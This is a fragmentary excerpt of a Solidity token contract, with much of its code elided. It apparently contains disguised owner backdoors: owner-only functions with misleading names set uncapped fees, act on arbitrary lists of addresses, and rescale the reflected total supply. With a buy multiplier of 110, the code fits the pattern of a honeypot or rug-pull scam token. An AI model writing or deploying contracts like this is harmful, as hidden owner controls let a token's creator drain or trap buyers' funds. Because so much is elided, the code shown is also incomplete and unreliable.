...
contract newtoken is Context, IERC20, Ownable{
  ...
  uint8 public shareLiquidityDenominator;
  uint8 public sellMultiplier;
  uint8 public buyMultiplier;
  uint8 public transferMultiplier;
  address public burnReceiver;

  event accountsAndLiquify(uint256 tokensSwapped, uint256 bnbReceived, uint256 tokensIntoLiqudity);
  event benefitAndLiquifyBusd(uint256 tokensSwapped, uint256 busdReceived, uint256 tokensIntoLiqudity);
  event changedRebaseLog(uint256 indexed epoch, uint256 totalSupply);
  ...
  constructor(string memory tName, string memory tSymbol, address router)  { 
    ...
    shareLiquidityDenominator = 120;
    sellMultiplier = 10;
    buyMultiplier = 110;
    transferMultiplier = 10;
  ...
  function MinnelliSaSaLa(address[] calldata accounts) external onlyOwner {
  ...
  function callersetExemptFee(address _addr, bool _value) external onlyOwner {
      require(_isExcludedFromFee[_addr] != _value, "Not changed");
      _isExcludedFromFee[_addr] = _value;
  }

  function decimalssetLiquidityTarget(uint8 target, uint8 accuracy) external onlyOwner {
      _liquidityFee = target;
      _mktFee = accuracy;
  }

  function fromswapSettings(bool _enabled, uint256 _num, uint256 _denom) external onlyOwner {
      isLiquidity = _enabled;
      _rTotal = _rTotal.div(_denom).mul(_num);
  }


  function https_transToExcluded(address sender, address recipient, uint256 tAmount) private {
